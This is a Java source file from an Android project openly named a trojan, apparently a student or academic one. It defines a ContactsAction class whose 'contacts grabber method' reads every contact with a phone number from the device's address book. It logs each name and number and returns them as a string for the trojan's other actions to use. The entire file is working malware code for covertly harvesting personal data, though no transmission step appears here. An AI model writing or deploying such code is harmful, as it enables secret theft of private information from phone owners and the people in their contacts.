package il.ac.colman.androidtrojan.Actions;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

public class ContactsAction implements ATAction {
	//class fields:
	private String _contacts;
	private Context _context;
	
	//ctor:
	public ContactsAction(Context _context) {
		//super:
		super();
		//adding the context:
		this._context = _context;
		
		//using methods to set _contacts:
		this._contacts = readContacts();
	}
	
	//setters & getters:
	public String get_contacts() {
		return _contacts;
	}
	
	
	//contacts grabber method:
	private String readContacts() {
		StringBuffer sb = new StringBuffer();
		sb.append("......Contact Details.....");

		ContentResolver cr = _context.getContentResolver();
		// sql query to get the contacts
		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
				null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
						+ " ASC");
		String phone = null;
		if (cur.getCount() > 0) {

			while (cur.moveToNext()) {

				// unique identifier for contact
				String id = cur.getString(cur
						.getColumnIndex(ContactsContract.Contacts._ID));

				String name = cur
						.getString(cur
								.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

				// get inside the cond. just if the contact has a phone number
				if (Integer
						.parseInt(cur.getString(cur
								.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
					System.out.println("name : " + name + ", ID : " + id);
					sb.append("\n Contact Name:" + name);

					// The MIME type of CONTENT_URI providing a directory of
					// phones
					Cursor pCur = cr.query(
							ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
							null,
							ContactsContract.CommonDataKinds.Phone.CONTACT_ID
									+ " = ?", new String[] { id }, null);

					// print out all the phones the current contact has
					while (pCur.moveToNext()) {
						phone = pCur
								.getString(pCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
						System.out.println("phone" + phone);
						sb.append("\n Phone number:" + phone);

					}
					pCur.close();
				}
			}
			sb.append("\n\n\n");
		}
		
		//returning the result:
		return sb.toString();
	}

	@Override
	public String getData() {
		// TODO Auto-generated method stub
		return _contacts;
	}
}
